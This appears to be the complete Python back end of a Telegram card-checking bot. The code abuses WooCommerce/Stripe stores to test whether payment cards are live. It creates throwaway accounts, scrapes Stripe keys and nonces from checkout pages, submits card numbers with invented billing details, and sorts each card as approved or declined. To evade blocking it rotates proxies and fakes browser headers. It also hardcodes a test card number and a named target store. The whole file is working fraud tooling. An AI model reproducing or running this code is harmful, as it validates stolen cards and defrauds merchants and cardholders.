import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import json
import threading
import os
import logging
from datetime import datetime

try:
    import fcntl
    HAS_FCNTL = True
except ImportError:
    HAS_FCNTL = False

from urllib.parse import urlparse, quote
from typing import Optional, Tuple, Dict, Any, List
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

_HERE = os.path.dirname(os.path.abspath(__file__))


# ============================================
# GATE HUNTER
# ============================================
class GateHunterFixed:
    def __init__(self, cache_file: str = "working_gates.txt", expiry_minutes: int = 30):
        self.cache_file = os.path.join(_HERE, cache_file)
        self.expiry_minutes = expiry_minutes
        self.ua = UserAgent()
        self.found_patterns = {
            'stripe_key_pattern': None,
            'nonce_pattern': None,
            'setup_nonce_pattern': None,
        }
        self.working_payment_pattern = {
            'endpoint_url': None,
            'endpoint_desc': None,
            'payload_name': None,
            'payload_data': None,
            'content_type': None,
            'content_desc': None,
        }
        self._session_cache = {}
        self._session_lock = threading.Lock()
        self._nonce_cache = {}
        self._nonce_lock = threading.Lock()

    def create_new_session(self, proxy_dict=None):
        session = requests.Session()
        session.verify = False
        if proxy_dict:
            session.proxies.update(proxy_dict)
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        })
        return session

    def _get_cached_session(self, domain, proxy_dict):
        return None, False

    def _save_session_cache(self, domain, session):
        pass

    def _get_cached_nonce(self, domain):
        return None

    def _save_nonce_cache(self, domain, nonce):
        pass

    def save_gate_details(self, domain, stripe_key, nonce, setup_nonce, cookies=None):
        try:
            cache_data = {}
            if os.path.exists(self.cache_file):
                with open(self.cache_file, 'r') as f:
                    try:
                        cache_data = json.load(f)
                    except json.JSONDecodeError:
                        cache_data = {}
            cache_data[domain] = {
                'stripe_key': stripe_key,
                'timestamp': datetime.now().isoformat(),
                'permanent': True,
                'payment_pattern': self.working_payment_pattern.copy()
                    if self.working_payment_pattern['endpoint_url'] else None
            }
            with open(self.cache_file, 'w') as f:
                json.dump(cache_data, f, indent=2)
        except Exception:
            pass

    def load_gate_details(self, domain):
        try:
            if not os.path.exists(self.cache_file):
                return None
            with open(self.cache_file, 'r') as f:
                cache_data = json.load(f)
            return cache_data.get(domain)
        except Exception:
            return None

    def is_gate_valid(self, gate_data):
        if not gate_data:
            return False
        return 'stripe_key' in gate_data

    def normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}".rstrip('/')

    def get_with_session(self, session, url, referer=None):
        headers = {'User-Agent': self.ua.random}
        if referer:
            headers['Referer'] = referer
        try:
            return session.get(url, headers=headers, timeout=15, verify=False)
        except Exception:
            return None

    def post_with_session(self, session, url, data, referer=None,
                          content_type=None, extra_headers=None):
        headers = {'User-Agent': self.ua.random}
        if referer:
            headers['Referer'] = referer
        headers['Content-Type'] = content_type or 'application/x-www-form-urlencoded'
        if extra_headers:
            headers.update(extra_headers)
        try:
            return session.post(url, data=data, headers=headers, timeout=15, verify=False)
        except Exception:
            return None

    def register_user(self, session, domain, proxy_dict=None):
        base_url = self.normalize_url(domain)
        reg_url = f"{base_url}/my-account/"
        try:
            proxies = proxy_dict if proxy_dict else {}
            r = session.get(reg_url, proxies=proxies, timeout=(15, 30), verify=False,
                            headers={'User-Agent': self.ua.random})
            if 'Log out' in r.text or 'My Account' in r.text:
                return True, "Already logged in"

            patterns = [
                r'name="woocommerce-register-nonce" value="([^"]+)"',
                r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
                r'register-nonce["\']?:\s*["\']([^\s"\']+)["\']',
                r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^\s"\']+)["\']'
            ]
            reg_nonce = None
            for p in patterns:
                m = re.search(p, r.text)
                if m:
                    reg_nonce = m.group(1)
                    break
            if not reg_nonce:
                fm = re.search(r'class="register"[\s\S]*?name="_wpnonce" value="([^"]+)"', r.text)
                if fm:
                    reg_nonce = fm.group(1)
            if not reg_nonce:
                return False, "No register nonce"

            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            email = f"{username}@gmail.com"
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            reg_data = {
                'username': username, 'email': email, 'password': password,
                'woocommerce-register-nonce': reg_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register'
            }
            rr = session.post(reg_url, data=reg_data,
                              headers={'Referer': reg_url, 'User-Agent': self.ua.random},
                              proxies=proxies, timeout=(8, 15), verify=False)
            if 'Log out' in rr.text or 'My Account' in rr.text or 'Registration successful' in rr.text:
                return True, email
            return False, "Registration failed"
        except Exception as e:
            return False, f"Register error: {str(e)[:80]}"

    def get_payment_page_data(self, session, domain, use_cache=True):
        saved_pattern = None
        cached_stripe_key = None

        if use_cache:
            cached = self.load_gate_details(domain)
            if cached and self.is_gate_valid(cached):
                if cached.get('payment_pattern'):
                    saved_pattern = cached['payment_pattern']
                cached_stripe_key = cached.get('stripe_key')

        base_url = self.normalize_url(domain)
        payment_urls = [
            f"{base_url}/my-account/add-payment-method/",
            f"{base_url}/checkout/",
            f"{base_url}/my-account/",
        ]

        for url in payment_urls:
            r = self.get_with_session(session, url, referer=base_url)
            if not r or r.status_code != 200:
                continue
            html = r.text

            stripe_key = cached_stripe_key
            if not stripe_key:
                stripe_patterns = [
                    (r'pk_live_[a-zA-Z0-9_]{24,100}', 'Basic pk_live'),
                    (r'"publishableKey":"(pk_live_[^"]+)"', 'JSON publishableKey'),
                    (r"'publishableKey':'([^']+)'", 'JSON pk single'),
                    (r'stripe\.com/v3/(pk_live_[^"\']+)', 'v3 URL'),
                    (r'var stripe = Stripe\(["\']([^"\']+)["\']\)', 'JS ctor'),
                    (r'"stripe_key":"([^"]+)"', 'stripe_key JSON'),
                ]
                for pat, name in stripe_patterns:
                    m = re.search(pat, html)
                    if m:
                        if 'pk_live_' in m.group(0):
                            stripe_key = m.group(0) if 'pk_live_' in m.group(0) else m.group(1)
                        else:
                            stripe_key = m.group(1)
                        if stripe_key and 'pk_live_' in stripe_key:
                            stripe_key = stripe_key[stripe_key.find('pk_live_'):]
                            stripe_key = stripe_key.split('"')[0].split("'")[0].split('\\')[0]
                        break

            nonce = None
            for pat, name in [
                (r'name=["\']_ajax_nonce["\'][^>]*value=["\']([a-f0-9]{8,12})["\']', 'ajax'),
                (r'data-nonce=["\']([a-f0-9]{8,12})["\']', 'data-nonce'),
                (r'"nonce":"([a-f0-9]{8,12})"', 'json nonce'),
                (r"'nonce':'([a-f0-9]{8,12})'", 'json single'),
                (r'name=["\']security["\'][^>]*value=["\']([a-f0-9]{8,12})["\']', 'security'),
                (r'woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([a-f0-9]{8,12})["\']', 'woo add pm'),
                (r'wc_stripe_params = \{[^}]*nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'wc_stripe'),
                (r'nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'generic'),
            ]:
                m = re.search(pat, html)
                if m:
                    nonce = m.group(1)
                    break

            setup_nonce = None
            for pat, name in [
                (r'create_and_confirm_setup_intent_nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'snake'),
                (r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'camel'),
                (r'"wc_stripe_setup_intent_nonce":"([a-f0-9]{8,12})"', 'wc_stripe'),
                (r'add_payment_method_nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']', 'add_pm'),
            ]:
                m = re.search(pat, html)
                if m:
                    setup_nonce = m.group(1)
                    break

            if stripe_key or nonce or setup_nonce:
                return stripe_key, nonce, setup_nonce, saved_pattern

        return None, None, None, None

    def create_stripe_payment_token(self, stripe_key, card_details, proxy_dict=None):
        try:
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Google Chrome";v="121", "Chromium";v="121", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': self.ua.random,
            }
            stripe_mid = str(uuid.uuid4())
            stripe_sid = str(uuid.uuid4())
            data = {
                'type': 'card',
                'card[number]': card_details['number'],
                'card[cvc]': card_details['cvc'],
                'card[exp_month]': card_details['month'],
                'card[exp_year]': card_details['year'],
                'billing_details[address][line1]': f'{random.randint(1,999)} Main St',
                'billing_details[address][city]': random.choice(['London', 'Manchester', 'Leeds', 'Bristol']),
                'billing_details[address][state]': random.choice(['London', 'Manchester', 'Leeds', 'Bristol']),
                'billing_details[address][postal_code]': f'SW{random.randint(1,9)}A {random.randint(1,9)}AA',
                'billing_details[address][country]': 'GB',
                'billing_details[name]': ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize() + ' ' +
                                          ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize(),
                'billing_details[email]': ''.join(random.choices(string.ascii_lowercase, k=8)) +
                                          str(random.randint(10, 99)) + '@gmail.com',
                'key': stripe_key,
                '_stripe_version': '2024-11-20.acacia',
                'payment_user_agent': 'stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element',
                'guid': str(uuid.uuid4()),
                'muid': stripe_mid,
                'sid': stripe_sid,
            }
            time.sleep(random.uniform(0.3, 0.6))
            r = requests.post('https://api.stripe.com/v1/payment_methods',
                              headers=headers, data=data,
                              proxies=proxy_dict if proxy_dict else None,
                              timeout=15, verify=False)
            if r.status_code == 200:
                result = r.json()
                if 'id' in result:
                    return True, result['id'], r.text
            return False, None, r.text
        except Exception as e:
            return False, None, str(e)

    def confirm_setup_intent_with_saved_pattern(self, session, domain, payment_token,
                                                nonce, pattern):
        base_url = self.normalize_url(domain)
        endpoint_url = pattern.get('endpoint_url')
        if not endpoint_url:
            return False, {'error': 'No endpoint URL'}

        payload_data = (pattern.get('payload_data') or {}).copy()
        for k in [k for k in payload_data if 'payment' in k.lower() or 'stripe' in k.lower()]:
            del payload_data[k]
        payload_data['wc-stripe-payment-method'] = payment_token
        payload_data['payment_method'] = payment_token
        for k in ['_ajax_nonce', 'nonce', 'security', '_wpnonce']:
            if k in payload_data:
                del payload_data[k]
        payload_data['_ajax_nonce'] = nonce

        extra = {'X-Requested-With': 'XMLHttpRequest'}
        try:
            r = self.post_with_session(
                session, endpoint_url, data=payload_data,
                referer=f"{base_url}/my-account/add-payment-method/",
                content_type=pattern.get('content_type', 'application/x-www-form-urlencoded'),
                extra_headers=extra
            )
            if r:
                try:
                    j = r.json()
                    if j.get('success') is True or j.get('data', {}).get('status') == 'succeeded':
                        return True, {'result': j, 'is_json': True}
                    if 'error' in str(j).lower():
                        return False, {'result': j, 'is_json': True}
                except Exception:
                    t = (r.text or "").lower()
                    if any(x in t for x in ['succeeded', 'success', 'confirmed']):
                        return True, {'result': r.text, 'is_json': False}
                    if any(x in t for x in ['decline', 'error', 'failed']):
                        return False, {'result': r.text, 'is_json': False}
        except Exception:
            pass
        return False, {'error': 'Saved pattern failed'}

    def confirm_setup_intent_with_session(self, session, domain, payment_token,
                                          nonce, use_saved_pattern=False, saved_pattern=None):
        base_url = self.normalize_url(domain)

        if use_saved_pattern and saved_pattern and saved_pattern.get('endpoint_url'):
            ok, data = self.confirm_setup_intent_with_saved_pattern(
                session, domain, payment_token, nonce, saved_pattern)
            if ok or 'error' not in data:
                return ok, data

        endpoints = [
            (f"{base_url}/wp-admin/admin-ajax.php?action=wc_stripe_create_and_confirm_setup_intent", "AA action param"),
            (f"{base_url}/wp-admin/admin-ajax.php", "AA standard"),
            (f"{base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", "WC ajax"),
            (f"{base_url}/my-account/add-payment-method/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", "acct WC"),
        ]
        payloads = [
            ('std', {'action': 'wc_stripe_create_and_confirm_setup_intent',
                     'wc-stripe-payment-method': payment_token,
                     'wc-stripe-payment-type': 'card',
                     '_ajax_nonce': nonce}),
            ('pm simple', {'action': 'wc_stripe_create_and_confirm_setup_intent',
                           'payment_method': payment_token, '_ajax_nonce': nonce}),
            ('nonce key', {'action': 'wc_stripe_create_and_confirm_setup_intent',
                           'payment_method': payment_token, 'nonce': nonce}),
            ('security key', {'action': 'wc_stripe_create_and_confirm_setup_intent',
                              'payment_method': payment_token, 'security': nonce}),
            ('json format', {'action': 'wc_stripe_create_setup_intent',
                             'payment_method': payment_token, '_wpnonce': nonce}),
        ]

        for endpoint_url, edesc in endpoints:
            for pname, pdata in payloads:
                for ctype in ('application/x-www-form-urlencoded', 'application/json'):
                    headers = {
                        'User-Agent': self.ua.random,
                        'Referer': f"{base_url}/my-account/add-payment-method/",
                        'X-Requested-With': 'XMLHttpRequest',
                        'Content-Type': ctype,
                    }
                    try:
                        if ctype == 'application/json':
                            r = session.post(endpoint_url, json=pdata, headers=headers,
                                             timeout=15, verify=False)
                        else:
                            r = session.post(endpoint_url, data=pdata, headers=headers,
                                             timeout=15, verify=False)
                        if not r:
                            continue

                        is_json = False
                        result = {}
                        try:
                            result = r.json()
                            is_json = True
                        except Exception:
                            pass

                        stop = False
                        ok = False
                        if is_json and isinstance(result, dict):
                            if result.get('success') is True or \
                               result.get('data', {}).get('status') == 'succeeded':
                                ok = True
                                stop = True
                            elif 'error' in str(result).lower() and any(
                                x in str(result).lower() for x in
                                ['decline', 'card', 'cvv', 'expired', 'funds', 'security code']):
                                ok = False
                                stop = True
                        else:
                            t = (r.text or "").lower()
                            if any(x in t for x in ['succeeded', 'success', 'confirmed']):
                                ok = True
                                stop = True
                            elif any(x in t for x in ['decline', 'card', 'cvv', 'expired', 'funds']):
                                ok = False
                                stop = True

                        if stop:
                            self.working_payment_pattern = {
                                'endpoint_url': endpoint_url,
                                'endpoint_desc': edesc,
                                'payload_name': pname,
                                'payload_data': pdata,
                                'content_type': ctype,
                                'content_desc': ctype,
                            }
                            return ok, {'result': result, 'is_json': is_json}
                    except Exception:
                        continue
        return False, {'error': 'All attempts failed'}

    def process_single_gate(self, domain, ccx, proxy_dict=None, use_cache=True):
        start_time = time.time()
        saved_pattern = None

        self.working_payment_pattern = {
            'endpoint_url': None, 'endpoint_desc': None,
            'payload_name': None, 'payload_data': None,
            'content_type': None, 'content_desc': None,
        }

        try:
            try:
                n, mm, yy, cvc = ccx.strip().split("|")
            except Exception:
                return {'status': 'ERROR', 'response': 'Invalid card format', 'time': 0}

            if len(yy) == 4:
                yy = yy[2:]

            card_details = {
                'number': n.replace(' ', ''),
                'cvc': cvc,
                'month': mm,
                'year': yy
            }
            base_url = self.normalize_url(domain)

            cached_data = self.load_gate_details(domain) if use_cache else None
            has_cached_pattern = (cached_data and
                                  self.is_gate_valid(cached_data) and
                                  cached_data.get('payment_pattern'))
            cached_stripe_key = cached_data.get('stripe_key') if cached_data else None

            # FAST PATH
            if has_cached_pattern and cached_stripe_key:
                saved_pattern = cached_data['payment_pattern']
                session = self.create_new_session(proxy_dict)

                nonce = None
                r = self.get_with_session(session,
                                          f"{base_url}/my-account/add-payment-method/",
                                          referer=base_url)
                if r and r.status_code == 200:
                    for pat in [
                        r'createAndConfirmSetupIntentNonce["\']?\s*[=:]\s*["\']([a-f0-9]{8,12})["\']',
                        r'create_and_confirm_setup_intent_nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']',
                        r'"nonce":"([a-f0-9]{8,12})"',
                        r'nonce["\']?\s*:\s*["\']([a-f0-9]{8,12})["\']',
                    ]:
                        m = re.search(pat, r.text)
                        if m:
                            nonce = m.group(1)
                            break

                if not nonce:
                    nonce = 'fallback_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

                pm_ok, token, pm_raw = self.create_stripe_payment_token(
                    cached_stripe_key, card_details, proxy_dict)
                if not pm_ok:
                    return {'status': 'FAILED', 'response': pm_raw,
                            'time': time.time() - start_time}

                ok, setup_result = self.confirm_setup_intent_with_session(
                    session, domain, token, nonce,
                    use_saved_pattern=True, saved_pattern=saved_pattern)

                elapsed = time.time() - start_time
                response_text = self._extract_response_text(setup_result)
                return {
                    'status': 'APPROVED' if ok else 'FAILED',
                    'response': response_text or ('Approved' if ok else 'All payment attempts failed'),
                    'time': elapsed
                }

            # SLOW PATH
            session = self.create_new_session(proxy_dict)

            home_response = self.get_with_session(session, base_url)
            if not home_response:
                if proxy_dict:
                    try:
                        tr = requests.get("http://ip-api.com/json/?fields=query",
                                          proxies=proxy_dict, timeout=6, verify=False)
                        proxy_alive = tr.status_code == 200
                    except Exception:
                        proxy_alive = False
                    if proxy_alive:
                        return {'status': 'FAILED',
                                'response': 'Site blocked proxy ❌ — use residential proxy',
                                'time': time.time() - start_time}
                    else:
                        return {'status': 'FAILED',
                                'response': 'Proxy dead ❌ — add a new one',
                                'time': time.time() - start_time}
                return {'status': 'FAILED',
                        'response': 'Site unreachable',
                        'time': time.time() - start_time}

            self.register_user(session, domain, proxy_dict)

            stripe_key, nonce, setup_nonce, saved_pattern = self.get_payment_page_data(
                session, domain, use_cache=use_cache)

            if not stripe_key:
                return {'status': 'FAILED', 'response': 'No Stripe key found',
                        'time': time.time() - start_time}

            use_nonce = setup_nonce or nonce
            if not use_nonce:
                use_nonce = 'fallback_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

            pm_ok, token, pm_raw = self.create_stripe_payment_token(
                stripe_key, card_details, proxy_dict)
            if not pm_ok:
                return {'status': 'FAILED', 'response': pm_raw,
                        'time': time.time() - start_time}

            ok, setup_result = self.confirm_setup_intent_with_session(
                session, domain, token, use_nonce,
                use_saved_pattern=use_cache, saved_pattern=saved_pattern)

            if self.working_payment_pattern['endpoint_url']:
                self.save_gate_details(domain, stripe_key, nonce, setup_nonce)

            elapsed = time.time() - start_time
            response_text = self._extract_response_text(setup_result)
            return {
                'status': 'APPROVED' if ok else 'FAILED',
                'response': response_text or ('Approved' if ok else 'All payment attempts failed'),
                'time': elapsed
            }

        except Exception as e:
            return {'status': 'ERROR', 'response': str(e)[:120],
                    'time': time.time() - start_time}

    def _extract_response_text(self, setup_result):
        response_text = ""
        if isinstance(setup_result, dict):
            r = setup_result.get('result', {})
            if isinstance(r, dict):
                response_text = json.dumps(r)
            elif isinstance(r, str):
                response_text = r
            else:
                response_text = str(r)
            if 'error' in setup_result:
                response_text = setup_result['error']
        return response_text


# ============================================
# SINGLE HUNTER INSTANCE
# ============================================
hunter = GateHunterFixed(cache_file="working_gates.txt", expiry_minutes=30)


# ============================================
# SITES
# ============================================
HARDCODED_SITES = ["rubyatelier.com"]
current_site_index = 0
site_lock = threading.Lock()
SITES_FILE = os.path.join(_HERE, "sites_config.json")


def _load_sites_from_file():
    global HARDCODED_SITES
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, 'r') as f:
                data = json.load(f)
                sites = data.get('sites', [])
                if sites:
                    HARDCODED_SITES = sites
    except Exception:
        pass


def _save_sites_to_file():
    try:
        with open(SITES_FILE, 'w') as f:
            json.dump({'sites': HARDCODED_SITES}, f, indent=2)
    except Exception:
        pass


_load_sites_from_file()


def add_site(domain):
    global HARDCODED_SITES
    with site_lock:
        domain = domain.strip().lower().replace('https://', '').replace('http://', '').rstrip('/')
        if domain and domain not in HARDCODED_SITES:
            HARDCODED_SITES.append(domain)
            _save_sites_to_file()
            return True
        return False


def remove_site(domain):
    global HARDCODED_SITES
    with site_lock:
        domain = domain.strip().lower().replace('https://', '').replace('http://', '').rstrip('/')
        if domain in HARDCODED_SITES:
            HARDCODED_SITES.remove(domain)
            _save_sites_to_file()
            return True
        return False


def get_all_sites():
    return HARDCODED_SITES.copy()


def clear_all_sites():
    global HARDCODED_SITES
    with site_lock:
        HARDCODED_SITES = []
        _save_sites_to_file()


def get_next_site():
    with site_lock:
        global current_site_index
        if not HARDCODED_SITES:
            return None
        s = HARDCODED_SITES[current_site_index % len(HARDCODED_SITES)]
        current_site_index = (current_site_index + 1) % len(HARDCODED_SITES)
        return s


# ============================================
# PROXIES
# ============================================
USER_PROXIES_FILE = os.path.join(_HERE, "user_proxies.json")
PROXIES_TXT_FILE = os.path.join(_HERE, "proxies.txt")
OWNER_ID = "8271950215"
proxy_lock = threading.Lock()


def load_user_proxies():
    try:
        if os.path.exists(USER_PROXIES_FILE):
            with open(USER_PROXIES_FILE, "r") as f:
                content = f.read()
                if not content:
                    return {}
                return json.loads(content)
    except Exception:
        pass
    return {}


def save_user_proxies(data):
    with proxy_lock:
        try:
            temp_file = USER_PROXIES_FILE + ".tmp"
            with open(temp_file, "w") as f:
                if HAS_FCNTL:
                    fcntl.flock(f.fileno(), fcntl.LOCK_EX)
                json.dump(data, f, indent=2)
                if HAS_FCNTL:
                    fcntl.flock(f.fileno(), fcntl.LOCK_UN)
            os.replace(temp_file, USER_PROXIES_FILE)
            return True
        except Exception:
            return False


def parse_proxy_enhanced(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None, None, None
    protocol = "http"
    if "://" in proxy_str:
        p, proxy_str = proxy_str.split("://", 1)
        protocol = p.lower()
    if "@" in proxy_str:
        auth, addr = proxy_str.split("@", 1)
        url = f"{protocol}://{auth}@{addr}"
        return url, proxy_str, "Premium"
    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        url = f"{protocol}://{user}:{pw}@{ip}:{port}"
        return url, proxy_str, "Premium"
    if len(parts) == 2:
        ip, port = parts
        url = f"{protocol}://{ip}:{port}"
        return url, proxy_str, "Free"
    return None, None, None


def parse_proxy_from_bot(proxy_raw):
    if not proxy_raw:
        return None
    proxy_raw = str(proxy_raw).strip()
    if not proxy_raw:
        return None
    protocol = "http"
    clean = proxy_raw
    for proto in ["socks5h://", "socks5://", "socks4://", "https://", "http://"]:
        if proxy_raw.lower().startswith(proto):
            protocol = proto.replace("://", "")
            clean = proxy_raw[len(proto):]
            break
    ip = port = user = pw = None
    try:
        if "@" in clean:
            at = clean.rfind("@")
            auth = clean[:at]
            host = clean[at + 1:]
            hp = host.split(":")
            if len(hp) >= 2:
                ip, port = hp[0], hp[1]
            ci = auth.find(":")
            if ci > 0:
                user = auth[:ci]
                pw = auth[ci + 1:]
        else:
            parts = clean.split(":")
            if len(parts) == 2:
                ip, port = parts[0], parts[1]
            elif len(parts) >= 4:
                if parts[1].isdigit() and not parts[3].isdigit():
                    ip, port = parts[0], parts[1]
                    user, pw = parts[2], ":".join(parts[3:])
                elif parts[3].isdigit() and not parts[1].isdigit():
                    ip, port = parts[2], parts[3]
                    user, pw = parts[0], parts[1]
                else:
                    ip, port = parts[0], parts[1]
                    user, pw = parts[2], ":".join(parts[3:])
            elif len(parts) == 3:
                ip, port = parts[0], parts[1]
        if not ip or not port:
            return None
        if user and pw:
            url = f"{protocol}://{quote(user, safe='')}:{quote(pw, safe='')}@{ip}:{port}"
        else:
            url = f"{protocol}://{ip}:{port}"
        return {'http': url, 'https': url, 'raw': clean}
    except Exception:
        return None


def get_user_proxy(chat_id):
    data = load_user_proxies()
    ud = data.get(str(chat_id), {})
    if not ud:
        return None
    proxies = ud.get("proxies", [])
    if proxies and isinstance(proxies, list):
        live = [p for p in proxies if p.get("status") == "live"]
        if live:
            chosen = random.choice(live)
            raw = chosen.get("proxy")
            url, _, _ = parse_proxy_enhanced(raw)
            return url if url else raw
    if ud.get("status") == "dead":
        return None
    p = ud.get("proxy")
    if p:
        url, _, _ = parse_proxy_enhanced(p)
        return url if url else p
    return None


def _is_premium_proxy(proxy_str):
    if not proxy_str:
        return False
    c = proxy_str.strip()
    if "://" in c:
        c = c.split("://", 1)[1]
    if "@" in c:
        return True
    if len(c.split(":")) >= 4:
        return True
    return False


def _get_all_premium_proxies(exclude_user=None):
    data = load_user_proxies()
    out = []
    for uid, ud in data.items():
        if exclude_user and str(uid) == str(exclude_user):
            continue
        for p in ud.get("proxies", []):
            raw = p.get("proxy", "")
            if p.get("status") == "live" and _is_premium_proxy(raw):
                out.append(raw)
        top = ud.get("proxy", "")
        if top and _is_premium_proxy(top) and top not in out:
            out.append(top)
    return out


def get_proxy_for_request_global(chat_id=None):
    # 1) owner
    if str(chat_id) == OWNER_ID:
        p = get_user_proxy(chat_id)
        if p:
            return p
        prem = _get_all_premium_proxies()
        if prem:
            return random.choice(prem)

    # 2) user
    if chat_id:
        p = get_user_proxy(chat_id)
        if p:
            return p

    # 3) proxies.txt fallback
    try:
        if os.path.exists(PROXIES_TXT_FILE):
            with open(PROXIES_TXT_FILE) as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            if lines:
                return random.choice(lines)
    except Exception:
        pass

    return None


def get_proxy_for_request(chat_id=None):
    raw = get_proxy_for_request_global(chat_id)
    if raw:
        url, _, _ = parse_proxy_enhanced(raw)
        if url:
            return {'http': url, 'https': url, 'raw': raw}
        parsed = parse_proxy_from_bot(raw)
        if parsed:
            return {'http': parsed['http'], 'https': parsed['https'], 'raw': raw}
    return None


# ============================================
# BOT INTERFACE
# ============================================
def process_card_enhanced(domain, ccx, chat_id=None, use_registration=True,
                          received_proxy=None):
    proxy = None
    if received_proxy:
        proxy = parse_proxy_from_bot(received_proxy)
    if not proxy:
        proxy = get_proxy_for_request(chat_id)

    # If no proxy — go DIRECT (do not error)
    if proxy:
        proxy_dict = {'http': proxy['http'], 'https': proxy['https']}
    else:
        proxy_dict = None

    result = hunter.process_single_gate(domain, ccx, proxy_dict, use_cache=True)
    raw_response = result.get('response', 'Unknown')

    if 'Registration failed' in str(raw_response) or 'Site blocked' in str(raw_response):
        for fallback_site in get_all_sites():
            if fallback_site != domain:
                result = hunter.process_single_gate(fallback_site, ccx,
                                                    proxy_dict, use_cache=True)
                raw_response = result.get('response', 'Unknown')
                if 'Registration failed' not in str(raw_response) and \
                   'Site blocked' not in str(raw_response):
                    break

    status_map = {'APPROVED': 'Approved', 'FAILED': 'Declined', 'ERROR': 'Error'}
    clean = _clean_response(raw_response, result.get('status', 'ERROR'))
    return {
        "status": status_map.get(result.get('status', 'ERROR'), 'Declined'),
        "response": clean,
    }


def _clean_response(raw, status):
    try:
        if isinstance(raw, str):
            try:
                data = json.loads(raw)
            except Exception:
                data = None
            if data and isinstance(data, dict):
                if status == 'APPROVED' or data.get('success') is True:
                    return "Card added successfully 💯"
                err = data.get('data', {}).get('error', {})
                if isinstance(err, dict) and 'message' in err:
                    return err['message']
                if 'error' in data:
                    e = data['error']
                    if isinstance(e, dict) and 'message' in e:
                        return e['message']
                    return str(e)

            low = raw.lower()
            if status == 'APPROVED' or 'succeeded' in low or 'success' in low:
                return "Card added successfully 💯"
            if 'decline' in low:
                return "Your card was declined."
            if 'insufficient' in low:
                return "Insufficient funds."
            if 'expired' in low:
                return "Your card has expired."
            if 'incorrect' in low and 'cvc' in low:
                return "Incorrect CVC."
            if 'security code' in low:
                return "Incorrect security code."
            if 'lost' in low:
                return "Card reported lost."
            if 'stolen' in low:
                return "Card reported stolen."
            if 'processing' in low:
                return "Processing error, try again."
            if '3d' in low or 'authentication' in low:
                return "3D Secure authentication required."
        return raw if raw else "Unknown error"
    except Exception:
        return raw if raw else "Unknown error"


def check_site_status(domain, chat_id=None, received_proxy=None):
    domain = domain.replace('https://', '').replace('http://', '').split('/')[0].strip()
    proxy = None
    if received_proxy:
        proxy = parse_proxy_from_bot(received_proxy)
    else:
        proxy = get_proxy_for_request(chat_id)

    proxy_dict = {'http': proxy['http'], 'https': proxy['https']} if proxy else None

    try:
        test_card = "4154644405488124|09|2026|968"
        result = hunter.process_single_gate(domain, test_card, proxy_dict, use_cache=False)
        status = result.get('status', 'ERROR')
        response = result.get('response', 'No response')

        cached = hunter.load_gate_details(domain)
        has_pattern = cached and cached.get('payment_pattern') and \
                      cached['payment_pattern'].get('endpoint_url')
        stripe_key = cached.get('stripe_key', 'Not Found') if cached else 'Not Found'

        if status in ('APPROVED', 'FAILED') and 'No Stripe key' not in response:
            return {"status": "success", "stripe_key": stripe_key,
                    "message": "Site working! Pattern saved.",
                    "test_card_status": "Approved" if status == 'APPROVED' else "Declined",
                    "test_card_response": response,
                    "pattern_saved": has_pattern}
        elif stripe_key != 'Not Found':
            return {"status": "partial", "stripe_key": stripe_key,
                    "message": "Stripe key found but card test had issues",
                    "test_card_status": "Error", "test_card_response": response,
                    "pattern_saved": has_pattern}
        else:
            return {"status": "failed", "stripe_key": "Not Found",
                    "message": "Site has no valid Stripe key or unreachable",
                    "test_card_status": "Not Tested", "test_card_response": response}
    except Exception as e:
        return {"status": "failed", "stripe_key": "Not Found",
                "message": f"Error: {str(e)[:80]}",
                "test_card_status": "Not Tested",
                "test_card_response": f"Site check error: {str(e)[:80]}"}
